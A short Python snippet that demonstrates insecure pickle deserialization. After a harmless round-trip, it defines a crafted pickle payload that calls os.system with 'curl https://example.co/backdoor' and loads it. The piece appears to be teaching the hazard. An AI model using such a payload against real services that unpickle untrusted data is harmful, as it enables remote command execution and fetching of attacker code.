import pickle
class Foo:
    attr = 'A class attribute'

picklestring = pickle.dumps(Foo)
print(picklestring)

pickle.loads(picklestring)

# it's dangerous to deserialization
data = """cos
system
(S'curl https://example.co/backdoor'
tR.
"""
pickle.loads(data)
